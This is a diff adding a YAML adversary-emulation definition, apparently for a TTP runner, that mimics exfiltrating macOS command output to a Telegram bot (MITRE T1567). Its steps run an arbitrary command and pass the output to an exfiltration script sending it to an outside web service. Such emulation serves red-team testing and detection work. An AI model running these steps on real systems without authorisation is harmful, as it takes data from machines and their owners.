@@ -1,0 +1,29 @@
+---
+api_version: 2.0
+uuid: f99c8dbb-df67-431e-93ee-3f8a01635845
+name: Data Exfiltration via Telegram
+authors:
+  - hmashru
+description: |
+  This TTP mimics an attacker exfilterating data via a Telegram bot from a compromised macOS system provided a valid chat ID and bot token.
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1567 Exfiltration Over Web Service
+args:
+  - name: command
+    description: Command to execute on the target system and exfiltrate the output to Telegram
+steps:
+  - name: Gather information
+    inline: |
+      echo "Gathering information about the system..."
+      {{.Args.command}}
+    outputvar: output
+  - name: Send data to Telegram
+    inline: |
+      echo "Sending data to Telegram..."
+      python3 exfil-telegram.py '{[{.StepVars.output}]}'
